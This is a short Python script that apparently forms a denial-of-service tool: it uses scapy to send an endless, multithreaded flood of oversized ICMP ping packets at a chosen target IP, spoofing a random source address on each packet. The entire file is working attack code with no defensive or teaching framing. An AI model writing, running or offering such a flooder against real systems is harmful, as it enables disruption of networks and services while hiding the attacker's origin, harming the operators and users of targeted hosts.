import threading
from handler import args_handler
from ipgen import fake_ip_gen
from scapy.all import *


        
def attack(target):
    try:
        while True:
            s_addr = fake_ip_gen()   
            ip = IP(src= s_addr, dst= target)
            icmp = ICMP(type=8, code=0)
            flood_data = Raw(b"A"*1024)
            pkt =ip / icmp / flood_data
            send(pkt)
            
    except Exception as e:
        print(f"An error occurred: {str(e)}")


 
def main():
    target_ip, num_threads = args_handler() 
    
    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(target_ip,))
        thread.start()

  
if __name__ == '__main__':
    main()
 